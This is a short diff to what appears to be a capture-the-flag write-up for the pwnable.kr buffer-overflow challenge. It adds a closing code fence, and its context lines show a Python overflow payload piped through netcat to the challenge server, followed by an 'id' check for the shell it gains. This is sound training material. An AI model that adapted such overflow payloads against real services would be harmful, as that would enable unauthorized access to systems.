@@ -206,6 +206,7 @@ Once get the offset, I am going to overwrite the ```0xdeadbeef``` with ```0xcafe
 
 ```bash
 (python -c 'print "A"*52 + "\xbe\xba\xfe\xca"'; cat -) | nc pwnable.kr 9000
+```
 ```bash
 root@kali:~/20181212# (python -c 'print "A"*52 + "\xbe\xba\xfe\xca"'; cat -) | nc pwnable.kr 9000
 id
